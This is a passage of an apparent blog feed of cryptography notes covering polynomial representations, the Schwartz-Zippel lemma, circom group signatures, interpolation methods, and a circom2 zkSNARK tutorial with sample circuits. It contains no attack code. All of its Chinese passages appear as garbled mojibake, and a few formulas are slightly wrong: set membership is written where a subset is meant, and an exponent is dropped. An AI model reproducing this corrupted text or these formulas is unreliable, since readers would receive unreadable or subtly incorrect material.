function<code>pow(base, exp, mod=None)</code> is very useful.</p></li><li><p>Point-value representation: ä¸€ç»„äº’ä¸ç›¸åŒçš„ <spanclass="math inline">\((x_0, x_1,x_2, \cdots,x_{n})\)</span> ä»£å…¥ <spanclass="math inline">\(A(x)\)</span>, å¾—åˆ° n ä¸ªå–å€¼ <spanclass="math inline">\((y_0,y_1, \cdots, y_n)\)</span>, å…¶ä¸­ <spanclass="math inline">\(y_i = \sum_{j=0}^{n}a_jx_i\)</span>ï¼Œå¯ä»¥é€šè¿‡æ‹‰æ ¼æœ—æ—¥æ’å€¼æ–¹æ³•å”¯ä¸€ç¡®å®šå¤šé¡¹å¼ã€‚</p></li></ol><h2 id="schwartz-zippel-lemma">Schwartz-Zippel lemma</h2><p>Schwartz-Zippel lemmaæ˜¯å…³äºæœ‰é™åŸŸä¸­çš„å¤šå˜é‡å¤šé¡¹å¼é›¶ç‚¹ä¸ªæ•°çš„ç´§è‡´ä¸Šç•Œï¼Œå…·ä½“è¡¨è¿°å¦‚ä¸‹ï¼š</p><p>å¯¹äºåŸŸ <span class="math inline">\(\mathbb{F}\)</span>ä¸Šçš„æ¯ä¸ªé˜¶æœ€å¤šä¸º d çš„ n å˜å…ƒéé›¶å¤šé¡¹å¼ï¼Œå¯¹äºä»»æ„æœ‰é™é›†åˆ <spanclass="math inline">\(S \in \mathbb{F}\)</span>,</p><p><span class="math display">\[\begin{equation}    Pr_{r_1,\cdots,r_n \leftarrow S}[f(r_1, \cdots, r_n) = 0] \le\frac{d}{|S|}\end{equation}\]</span></p><p>ç­‰ä»·åœ°ï¼Œ f åœ¨ <span class="math inline">\(S^n\)</span> ä¸­æœ€å¤šæœ‰ <spanclass="math inline">\(d|S|^{n-1}\)</span> ä¸ªæ ¹, (<spanclass="math inline">\(Z(f)\)</span> æ˜¯ f çš„é›¶ç‚¹é›†)ï¼š<spanclass="math inline">\(|Z(f) \cap S^n| \le d*|S|^{n-1}\)</span></p><h2 id="symbolic-representation">symbolic representation</h2><p>In math scenarios, the symbolic representation is used forpolynomials by utilizing <code>Matlab</code> or the <code>sympy</code>library of Python. Although I prefer the Python library, it turns outthe <code>sympy</code> library is truly not as good as<code>Matlab</code> in practice. So prefer <code>Matlab</code>.</p><p>Note: The interpolation method for polynomials in the finite field is<strong>not fully implemented</strong> in <code>sympy</code>. Therefore,it is not recommended to use it for polynomials in the finite field.</p><p>Example code in Jupyter Notebook:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> IPython.display <span class="keyword">import</span> Math</span><br><span class="line">Math(<span class="string">&quot;f(x) = \sum_&#123;i=0&#125;^&#123;n-1&#125; a_i x^i&quot;</span>)</span><br></pre></td></tr></table></figure><p><span class="math display">\[f(x) = \sum_{i=0}^{n-1} a_ix^i\]</span></p><p>å°†ä¿¡æ¯ç¼–ç æˆ coefficient form å¤šé¡¹å¼çš„ç³»æ•°ï¼Œè¿˜æ˜¯ç¼–ç æˆå¤šé¡¹å¼çš„point-value representation çš„å€¼</p><h2 id="reference">Reference</h2><p><a href="https://hackmd.io/@Kurt-Pan/Bkq-tZGL5#">Schwartz-Zippelå¼•ç†çš„è¯æ˜ - HackMD</a></p>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Circom for signature and group signatures</title>
      <link href="/blog/2023/03/28/crypto/zk/8.zk_circom_signature/"/>
      <url>/blog/2023/03/28/crypto/zk/8.zk_circom_signature/</url>
      
        <content type="html"><![CDATA[<h1 id="signature-and-group-signatures">signature and groupsignatures</h1><p>Reference: <ahref="https://gist.github.com/realyee/fc9c9e31483a83d585de19604c5b5056">GroupSignMerklecircom</a> give the whole procedure of Group Signature with Merkleproof.</p><h2 id="signature">signature</h2><p>Normal signature</p><ol type="1"><li>KeyGen â†’ (sk, pk): selects a random secret key sk and correspondingpublic key pk</li><li>Sign(m, sk) â†’ s: given a message m and secret key, outputs asignature s</li><li>Verify(m, s, pk) â†’ 1/0: given a message m, a signature s, and apublic key pk, verifies if signature is valid</li></ol><p><ahref="https://gist.github.com/realyee/9d29ad1f85cb9dafcc135f21d9826e09">Normalsignature circom</a></p><h2 id="group-signature">group signature</h2><p>Group signature for group G</p><ol type="1"><li>KeyGen â†’ (ski, pki): selects a random set of secret keys ski andcorresponding public keys pki for each member of group</li><li>GroupSign(m, ski, G) â†’ : given a message m and secret key, outputs asignature s</li><li>GroupVerify(m, s, G) â†’ 1/0: given a message m, a signature s, andthe group G, verifies if the signature came from the group</li></ol><p><ahref="https://gist.github.com/realyee/1117e8e808bc0519e38ddeba248b7368">GroupSigncircom</a></p><p>With reference to <ahref="https://0xparc.org/blog/zk-group-sigs">Group Signatures withzkSNARKs</a></p><h2 id="merkle-tree">Merkle tree</h2><p>Merkle tree is a way to sort of accumulating a bunch of differentelements set into one commitment. Note that the hash result will bedifferent if the two input elements swap the order.</p><p>With the following references:</p><ol type="1"><li><ahref="https://github.com/semaphore-protocol/semaphore/blob/main/packages/circuits/tree.circom">MerkleTree Inclusion proof semaphore/tree.circom at main Â·semaphore-protocol/semaphore Â· GitHub</a> give the code about MerkleTree Inclusion proof.</li><li><ahref="https://github.com/iden3/circomlib/blob/master/circuits/poseidon.circom#L202">circomlib/poseidon.circomat master Â· iden3/circomlib Â· GitHub</a> and <ahref="https://github.com/iden3/circomlib/blob/cff5ab6288b55ef23602221694a6a38a0239dcc0/circuits/comparators.circom#L37">circomlib/comparators.circomat cff5ab6288b55ef23602221694a6a38a0239dcc0 Â· iden3/circomlib</a> givethe usage of poseidon hash and comparators/IsEqual.</li><li><ahref="https://github.com/tornadocash/tornado-core/blob/master/circuits/merkleTree.circom">tornado-core/merkleTree.circomat master Â· tornadocash/tornado-core Â· GitHub</a> give the circom of theverification of the Merkle Tree proof</li><li><a href="https://hackmd.io/@vb7401/zk-crypto-4">Modern ZK Crypto -Session 4 Lecture Notes - HackMD</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ•°å€¼æ–¹æ³•/æ•°å€¼åˆ†æä¸æ’å€¼</title>
      <link href="/blog/2023/03/27/crypto/math/8.numerical_analysis/"/>
      <url>/blog/2023/03/27/crypto/math/8.numerical_analysis/</url>
      
        <content type="html"><![CDATA[<h1 id="æ•°å€¼æ–¹æ³•æ•°å€¼åˆ†æ">æ•°å€¼æ–¹æ³•/æ•°å€¼åˆ†æ</h1><p>ã€Šè®¡ç®—æ–¹æ³•-æ•°å€¼åˆ†æä¸ç¨‹åºè®¾è®¡ã€‹-(Introduction to Numerical Analysisand Scientific Computing</p><p>è¿˜æœ‰è¿‘ä¼¼è®¡ç®—ï¼Œéšæœºç®—æ³•ï¼Œå‡¸ä¼˜åŒ–</p><p>æ’å€¼æ³•æ˜¯é€¼è¿‘è®ºä¸­çš„ä¸€ç§åŸºæœ¬æ–¹æ³•ã€‚å¤šé¡¹å¼æ’å€¼æ˜¯æ•´ä¸ªæ•°å€¼é€¼è¿‘çš„åŸºç¡€,ä½†æ˜¯é«˜æ¬¡æ’å€¼äº§ç”Ÿçš„Rungeç°è±¡é™åˆ¶äº†å®ƒçš„åº”ç”¨ã€‚æœ‰ç†æ’å€¼çš„æ”¶æ•›é€Ÿåº¦è¾ƒå¤šé¡¹å¼å¿«,å®ƒé€‚åˆäºé€¼è¿‘æœ‰æç‚¹çš„å‡½æ•°</p><p>åŸºæœ¬ç±»å‹æœ‰ï¼šplnï¼ˆå¤šé¡¹å¼å‡½æ•°æ’å€¼ï¼‰ã€trigï¼ˆä¸‰è§’å‡½æ•°ï¼‰ã€expï¼ˆæŒ‡æ•°å‡½æ•°ï¼‰ã€rationalï¼ˆæœ‰ç†å‡½æ•°ï¼‰ã€splinesï¼ˆåˆ†æ®µå‡½æ•°ï¼‰ã€Hermiteï¼ˆåŸƒå°”ç±³ç‰¹ï¼‰</p><p>ä¸åŒæ’å€¼æ–¹æ³•çš„åŒºåˆ«åœ¨äºæ’å€¼å‡½æ•° p(x) çš„é€‰å–ã€‚</p><h2 id="æ–¹æ³•è¡¥å……è¯´æ˜">æ–¹æ³•è¡¥å……è¯´æ˜</h2><ol type="1"><li><p>å¤šé¡¹å¼ å‡ ä½•ä¸Šå¯ç†è§£ä¸ºï¼šå·²çŸ¥å¹³é¢ä¸Š n+1 ä¸ªä¸åŒç‚¹ï¼Œè¦å¯»æ‰¾ä¸€æ¡ næ¬¡å¤šé¡¹å¼æ›²çº¿é€šè¿‡è¿™äº›ç‚¹ã€‚æ’å€¼å¤šé¡¹å¼ä¸€èˆ¬æœ‰ä¸¤ç§å¸¸è§çš„è¡¨è¾¾å½¢å¼ï¼Œä¸€ä¸ªæ˜¯æ‹‰æ ¼æœ—æ—¥æ’å€¼å¤šé¡¹å¼ï¼Œå¦ä¸€ä¸ªæ˜¯ç‰›é¡¿æ’å€¼å¤šé¡¹å¼ã€‚æ³¨æ„ï¼šå› å¤šé¡¹å¼å‡½æ•°æ’å€¼å­˜åœ¨é¾™æ ¼ç°è±¡ï¼ˆä¸‹å›¾æ‰€ç¤ºï¼‰ï¼Œæ•…å°½å¯èƒ½é€‰å–5 æ¬¡åŠä»¥ä¸‹å¤šé¡¹å¼å‡½æ•°æ’å€¼ã€‚</p></li><li><p>ä¸‰è§’å‡½æ•° å½“è¢«æ’å‡½æ•°æ˜¯ä»¥ 2Ï€ ä¸ºå‘¨æœŸçš„å‡½æ•°æ—¶ï¼Œé€šå¸¸ç”¨ né˜¶ä¸‰è§’å¤šé¡¹å¼ä½œä¸ºæ’å€¼å‡½æ•°ï¼Œä¸€èˆ¬è¦è¿ç”¨å‚…é‡Œå¶å˜æ¢åŠé«˜æ–¯ä¸‰è§’æ’å€¼è¡¨å‡ºã€‚</p></li><li><p>æŒ‡æ•°å‡½æ•° åˆ†æçˆ†ç‚¸æ€§å¢é•¿ç°è±¡æˆ–æ”¾å°„æ€§å…ƒç´ è¡°å‡æ—¶å¸¸è¢«é‡‡ç”¨</p></li><li><p>æœ‰ç†å‡½æ•°æœ‰ç†å‡½æ•°æ˜¯é€šè¿‡å¤šé¡¹å¼çš„åŠ å‡ä¹˜é™¤å¾—åˆ°çš„å‡½æ•°ã€‚åœ¨æ•°å­¦ä¸­ï¼Œç†æ€§å‡½æ•°æ˜¯å¯ä»¥ç”±æœ‰ç†åˆ†æ•°å®šä¹‰çš„ä»»ä½•å‡½æ•°ï¼Œå³ä»£æ•°åˆ†æ•°ï¼Œä½¿å¾—åˆ†å­å’Œåˆ†æ¯éƒ½æ˜¯å¤šé¡¹å¼ã€‚</p></li><li><p>åˆ†æ®µå‡½æ•°ï¼ˆä¸‰æ¬¡æ ·æ¡æ’å€¼æ³•ï¼‰è¿ç»­ä¸¤ç«¯æ¥å…¥èŠ‚ç‚¹çš„å‡½æ•°å€¼å’Œå¯¼æ•°ç›¸ç­‰</p></li><li><p>åŸƒå°”ç±³ç‰¹è¿™ç±»æ’å€¼åœ¨ç»™å®šçš„èŠ‚ç‚¹å¤„ï¼Œä¸ä»…è¦æ±‚æ’å€¼å¤šé¡¹å¼çš„å‡½æ•°å€¼ä¸åŸå‡½ç›¸åŒï¼Œè¿˜è¦æ±‚åœ¨èŠ‚ç‚¹å¤„çš„å¯¼æ•°å€¼ç”šè‡³é«˜é˜¶å¯¼æ•°å€¼ä¹Ÿç›¸ç­‰ã€‚å³è¦æ±‚ä¸åŸå‡½å…‰æ»‘ç¨‹åº¦é«˜åº¦ç›¸ä¼¼ã€‚æ³¨æ„ï¼šç›´æ¥ä½¿ç”¨Hermite æ’å€¼å¾—åˆ°çš„å¤šé¡¹å¼æ¬¡æ•°è¾ƒé«˜ï¼Œä¹Ÿå­˜åœ¨ç€é¾™æ ¼ç°è±¡ï¼Œå› æ­¤åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå¾€å¾€ä½¿ç”¨åˆ†æ®µä¸‰æ¬¡ Hermite æ’å€¼å¤šé¡¹å¼ (PCHIP)ã€‚</p></li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p><ahref="https://www.bilibili.com/opus/735477926585171990?from=search">æ•°å€¼æ–¹æ³•/æ•°å€¼åˆ†æï¼ˆå®Œï¼‰- å“”å“©å“”å“©</a></p>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>circom2 for zkSNARK</title>
      <link href="/blog/2023/03/26/crypto/zk/6.zk_circom1/"/>
      <url>/blog/2023/03/26/crypto/zk/6.zk_circom1/</url>
      
        <content type="html"><![CDATA[<h1 id="zksnark">zkSNARK</h1><h2 id="high-level-idea">High-level idea</h2><ol type="1"><li>Turn your problem (graph isomorphism, discrete log, etc.) into afunction whose inputs you want to hide.</li><li>Turn that function into an equivalent set of R1CS (or other)equations<ol type="1"><li>Basically, an arithmetic circuit, that is a bunch of <code>+</code>and <code>*</code> operations on prime field elements</li><li>Simplified: equations of the form <span class="math inline">\(x_i +x_j = x_k, or x_i * x_j = x_k\)</span></li></ol></li><li>Generate a ZKP for satisfiability of the R1CS</li></ol><h2 id="zksnark-prove-constraints">zkSNARK prove constraints</h2><p>The best is those zk protocols that generate a proof of the same sizeregardless of the length of the computation and the verification alsotakes the same time.</p><p>Example:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Function inputs: x1, x2, x3, x4</span><br><span class="line">OUT = f(x) = (x1 + x2) * x3 - x4</span><br></pre></td></tr></table></figure><p>zkSNARK: I know some secret (x1,x2,x3,x4) such that the result ofthis computation f is OUT. Here's is a signature that prove that I knowsuch a tuple, without telling you what the tuple actually is.</p><p>From the perspective of a human, the procedure of the computation ismade as follows:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function inputs: x1, x2, x3, x4</span><br><span class="line">y1 := x1 + x2</span><br><span class="line">y2 := y1 * x3</span><br><span class="line">OUT := y2 - x4</span><br></pre></td></tr></table></figure><p>However, from perspective of SNARK generating the proof, where only<code>+</code> and <code>*</code> is made as follows: SNARK proverinputs: x1, x2, x3, x4, y1, y2, OUT SNARK prover output: a â€œsignatureâ€that only verifies if the following constraints are satisfied:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">y1 == x1 + x2</span><br><span class="line">y2 == y1 * x3</span><br><span class="line">y2 == OUT + x4</span><br></pre></td></tr></table></figure><p>The SNARK basically is just a proof of satifaction of someconstraints. For the snark machinery, it will see seven varibles<code>x1, x2, x3, x4, y1, y2, OUT</code>. The prover's out is asignatureã€a proof that should only be valid if the above threeequations are ture. OUT is the value that will be reveal to theverifier. The snark proof is about proving that the prover knows somesix values satisfy this three equations for a particular public value ofOUT. Proving that I know some solution to this set of equations isequivalent to proving that I have executed this function.</p><p>If you care about actually hiding some inputs, then the funtion youare computiong is better to be a funtion that cannot be recoverable orreversed, which is zkSNARK. But sometime you dont care about that, youjust care about a succict proof of the computation, which is SNARK.</p><p>If the example include division, such as:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Function inputs: x1, x2, x3, x4</span><br><span class="line">OUT = f(x) = (x1 + x2) / x3 - x4</span><br></pre></td></tr></table></figure><p>Then, the computation can be seen as follows:</p><p>From the perspective of human,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function inputs: x1, x2, x3, x4</span><br><span class="line">y1 := x1 + x2</span><br><span class="line">y2 := y1 / x3</span><br><span class="line">OUT := y2 - x4</span><br></pre></td></tr></table></figure><p>From the perspective of prover, (note the equivalence of the tworepresentation)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SNARK prover inputs: x1, x2, x3, x4, y1, y2, OUT</span><br><span class="line">SNARK prover output: a â€œsignatureâ€ that only verifies if the following constraints are satisfied:</span><br><span class="line">y1 == x1 + x2</span><br><span class="line">y1 == y2 * x3 with x3 != 0</span><br><span class="line">y2 == OUT + x4</span><br></pre></td></tr></table></figure><p>In zkrepl, the code can be shown as follows:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma circom <span class="number">2.1</span><span class="number">.4</span>;</span><br><span class="line"></span><br><span class="line">template <span class="title class_">Example</span> () &#123;</span><br><span class="line">    <span class="comment">// instantiate the variables</span></span><br><span class="line">    signal input x1;</span><br><span class="line">    signal input x2;</span><br><span class="line">    signal input x3;</span><br><span class="line">    signal input x4;</span><br><span class="line"></span><br><span class="line">    signal input y1;</span><br><span class="line">    signal input y2;</span><br><span class="line"></span><br><span class="line">    signal input <span class="variable constant_">OUT</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// write the constraints</span></span><br><span class="line">    y1 === x1 + x2;</span><br><span class="line">    y1 === y2 * x3;</span><br><span class="line">    y2 === <span class="variable constant_">OUT</span> + x4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Circom allows you to specify which of your varibles are public to the verifier. By default, the varibles are private</span></span><br><span class="line">component main &#123; public [ <span class="variable constant_">OUT</span> ] &#125; = <span class="title class_">Example</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// the following lines is used to test whether the proof and verification is done right by using cases</span></span><br><span class="line"><span class="comment">/* INPUT = &#123;</span></span><br><span class="line"><span class="comment">    &quot;x1&quot;: &quot;15&quot;,</span></span><br><span class="line"><span class="comment">    &quot;x2&quot;: &quot;13&quot;,</span></span><br><span class="line"><span class="comment">    &quot;x3&quot;: &quot;7&quot;,</span></span><br><span class="line"><span class="comment">    &quot;x4&quot;: &quot;1&quot;,</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    &quot;y1&quot;: &quot;28&quot;,</span></span><br><span class="line"><span class="comment">    &quot;y2&quot;: &quot;4&quot;,</span></span><br><span class="line"><span class="comment">    &quot;OUT&quot;: &quot;3&quot;</span></span><br><span class="line"><span class="comment">&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// press shift + enter, &quot;Everything went okay, circom safe&quot; means the circom are able to generate the artifacts and proof of zkSANRK</span></span><br><span class="line"><span class="comment">/* if the following line appears under the â€œARTIFACTS:&quot;ï¼Œit means constraint you write is ok,</span></span><br><span class="line"><span class="comment">which can be compiled as a proof, but the specific value you are using to test is not right, which is not meet the constraints</span></span><br><span class="line"><span class="comment">FAIL:</span></span><br><span class="line"><span class="comment">Error: Assert Failed.</span></span><br><span class="line"><span class="comment">Error in template Example_0 line: 17</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>Note: In the end of the INPUT and before the <code>&#125;</code>, no commais allowed, or the error "Expected double-quoted property name in JSONat position 62" will be reported.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pragma circom 2.1.4;</span><br><span class="line"></span><br><span class="line">template Example () &#123;</span><br><span class="line">    // instantiate the variables</span><br><span class="line">    signal input x1;</span><br><span class="line">    signal input x2;</span><br><span class="line">    signal input x3;</span><br><span class="line">    signal input x4;</span><br><span class="line"></span><br><span class="line">    signal y1;</span><br><span class="line">    signal y2;</span><br><span class="line"></span><br><span class="line">    signal output out;</span><br><span class="line"></span><br><span class="line">    y1 &lt;-- x1 + x2;</span><br><span class="line">    y2 &lt;-- y1 / x3;</span><br><span class="line">    out &lt;-- y2 - x4;</span><br><span class="line"></span><br><span class="line">    // write the constraints</span><br><span class="line">    y1 === x1 + x2;</span><br><span class="line">    y1 === y2 * x3;</span><br><span class="line">    y2 === out + x4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Circom allows you to specify which of your varibles are public to the verifier. By default, the varibles are private</span><br><span class="line">component main = Example();</span><br><span class="line"></span><br><span class="line">// the following lines is used to test whether the proof and verification is done right by using cases</span><br><span class="line">/* INPUT = &#123;</span><br><span class="line">    &quot;x1&quot;: &quot;4&quot;,</span><br><span class="line">    &quot;x2&quot;: &quot;6&quot;,</span><br><span class="line">    &quot;x3&quot;: &quot;2&quot;,</span><br><span class="line">    &quot;x4&quot;: &quot;1&quot;</span><br><span class="line">&#125; */</span><br></pre></td></tr></table></figure><p>The circom is a specification of a constraint system that you areallowed to prove satisfaction, rather than a program To elimanate theintermediate value redundancy for us, the circom provide the functionlike what we precompute the intermediate value in python or somewhereelse.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pragma circom 2.1.4;</span><br><span class="line"></span><br><span class="line">template Example () &#123;</span><br><span class="line">    // instantiate the variables</span><br><span class="line">    signal input x1;</span><br><span class="line">    signal input x2;</span><br><span class="line">    signal input x3;</span><br><span class="line">    signal input x4;</span><br><span class="line"></span><br><span class="line">    signal y1;</span><br><span class="line">    signal y2;</span><br><span class="line"></span><br><span class="line">    signal output out;</span><br><span class="line"></span><br><span class="line">    y1 &lt;-- x1 + x2;</span><br><span class="line">    y2 &lt;-- y1 / x3;</span><br><span class="line">    out &lt;-- y2 - x4;</span><br><span class="line"></span><br><span class="line">    // write the constraints</span><br><span class="line">    y1 === x1 + x2;</span><br><span class="line">    y1 === y2 * x3;</span><br><span class="line">    y2 === out + x4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Circom allows you to specify which of your varibles are public to the verifier. By default, the varibles are private</span><br><span class="line">component main = Example();</span><br><span class="line"></span><br><span class="line">// the following lines is used to test whether the proof and verification is done right by using cases</span><br><span class="line">/* INPUT = &#123;</span><br><span class="line">    &quot;x1&quot;: &quot;4&quot;,</span><br><span class="line">    &quot;x2&quot;: &quot;6&quot;,</span><br><span class="line">    &quot;x3&quot;: &quot;2&quot;,</span><br><span class="line">    &quot;x4&quot;: &quot;1&quot;</span><br><span class="line">&#125; */</span><br></pre></td></tr></table></figure><h2 id="num2bits">Num2Bits</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma circom 2.1.4;</span><br><span class="line"></span><br><span class="line">template Num2Bits (nBits) &#123;</span><br><span class="line">    signal input in;</span><br><span class="line">    signal input b[nBits];</span><br><span class="line"></span><br><span class="line">    var sum = 0;</span><br><span class="line">    for(var i = 0; i &lt; nBits; i++)&#123;</span><br><span class="line">        sum += (2**i) * b[i];</span><br><span class="line">    &#125;</span><br><span class="line">    in === sum;</span><br><span class="line">    for(var i = 0; i &lt; nBits; i++)&#123;</span><br><span class="line">        0 === b[i] * (b[i] - 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">component main &#123; public [ b ] &#125; = Num2Bits(5);</span><br><span class="line">// note: b array is from b0 to b(n-1), the left bit is the least significant bit</span><br><span class="line">/* INPUT = &#123;</span><br><span class="line">    &quot;in&quot;: &quot;11&quot;,</span><br><span class="line">    &quot;b&quot;:[&quot;1&quot;, &quot;1&quot;, &quot;0&quot;, &quot;1&quot;,&quot;0&quot;]</span><br><span class="line">&#125; */</span><br></pre></td></tr></table></figure><p>simplify the above code,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pragma circom 2.1.4;</span><br><span class="line"></span><br><span class="line">template Num2Bits (nBits) &#123;</span><br><span class="line">    signal input in;</span><br><span class="line">    signal output b[nBits];</span><br><span class="line"></span><br><span class="line">    for(var i = 0; i &lt; nBits; i++)&#123;</span><br><span class="line">        //  b[i] &lt;-- (in \ 2 ** i) % 2;</span><br><span class="line">        b[i] &lt;-- (in &gt;&gt; i) &amp; 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var sum = 0;</span><br><span class="line">    for(var i = 0; i &lt; nBits; i++)&#123;</span><br><span class="line">        sum += (2**i) * b[i];</span><br><span class="line">    &#125;</span><br><span class="line">    in === sum;</span><br><span class="line">    for(var i = 0; i &lt; nBits; i++)&#123;</span><br><span class="line">        0 === b[i] * (b[i] - 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">component main = Num2Bits(5);</span><br><span class="line">// note: b array is from b0 to b(n-1), the left bit is the least significant bit</span><br><span class="line">/* INPUT = &#123;</span><br><span class="line">    &quot;in&quot;: &quot;11&quot;</span><br><span class="line">&#125; */</span><br></pre></td></tr></table></figure><p>Errors like the following report, normally the problem is that asemicolon is forget to be put at the end of a sentences.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">error[P1000]: UnrecognizedToken &#123; token: (586, Token(78, &quot;&#125;&quot;), 587), expected: [&quot;\&quot;!=\&quot;&quot;, &quot;\&quot;%\&quot;&quot;, &quot;\&quot;&amp;\&quot;&quot;, &quot;\&quot;&amp;&amp;\&quot;&quot;, &quot;\&quot;)\&quot;&quot;, &quot;\&quot;*\&quot;&quot;, &quot;\&quot;**\&quot;&quot;, &quot;\&quot;+\&quot;&quot;, &quot;\&quot;,\&quot;&quot;, &quot;\&quot;-\&quot;&quot;, &quot;\&quot;--&gt;\&quot;&quot;, &quot;\&quot;/\&quot;&quot;, &quot;\&quot;:\&quot;&quot;, &quot;\&quot;;\&quot;&quot;, &quot;\&quot;&lt;\&quot;&quot;, &quot;\&quot;&lt;--\&quot;&quot;, &quot;\&quot;&lt;&lt;\&quot;&quot;, &quot;\&quot;&lt;=\&quot;&quot;, &quot;\&quot;&lt;==\&quot;&quot;, &quot;\&quot;=\&quot;&quot;, 